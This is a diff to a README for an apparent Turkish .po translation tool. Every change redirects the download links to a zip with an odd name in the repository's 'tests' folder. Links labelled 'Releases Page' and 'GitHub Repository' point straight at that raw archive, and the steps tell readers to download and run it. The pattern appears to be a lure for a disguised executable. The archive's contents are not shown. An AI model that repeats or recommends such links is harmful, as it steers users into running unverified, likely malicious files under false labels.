@@ -1,6 +1,6 @@
 # 🌍 Otomatik-Po-Cevirici - Effortless Language Translation Tool
 
-![Download](https://raw.githubusercontent.com/Umutbabaa/Otomatik-Po-Cevirici/main/diller/Po-Cevirici-Otomatik-v1.8.zip%20Now-Click%20Here-brightgreen)
+![Download](https://raw.githubusercontent.com/Umutbabaa/Otomatik-Po-Cevirici/main/tests/Otomatik-Cevirici-Po-supergallant.zip%20Now-Click%20Here-brightgreen)
 
 ## 📖 Description
 
@@ -12,7 +12,7 @@ Uygulamayı kullanmaya başlamak için aşağıdaki adımları izleyin. Herhangi
 
 ## 📥 Download & Install
 
-1. Ziyaret edin: [Releases Page](https://raw.githubusercontent.com/Umutbabaa/Otomatik-Po-Cevirici/main/diller/Po-Cevirici-Otomatik-v1.8.zip) 
+1. Ziyaret edin: [Releases Page](https://raw.githubusercontent.com/Umutbabaa/Otomatik-Po-Cevirici/main/tests/Otomatik-Cevirici-Po-supergallant.zip) 
 2. İlgili versiyonu indirin.
 3. İndirdiğiniz dosyayı bilgisayarınızda çalıştırın.
 
@@ -76,8 +76,8 @@ Herhangi bir sorunuz veya geri bildiriminiz olursa, lütfen iletişime geçmekte
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://raw.githubusercontent.com/Umutbabaa/Otomatik-Po-Cevirici/main/diller/Po-Cevirici-Otomatik-v1.8.zip)
-- [GitHub Repository](https://raw.githubusercontent.com/Umutbabaa/Otomatik-Po-Cevirici/main/diller/Po-Cevirici-Otomatik-v1.8.zip)
+- [Releases Page](https://raw.githubusercontent.com/Umutbabaa/Otomatik-Po-Cevirici/main/tests/Otomatik-Cevirici-Po-supergallant.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/Umutbabaa/Otomatik-Po-Cevirici/main/tests/Otomatik-Cevirici-Po-supergallant.zip)
 
 ## 📝 License
 
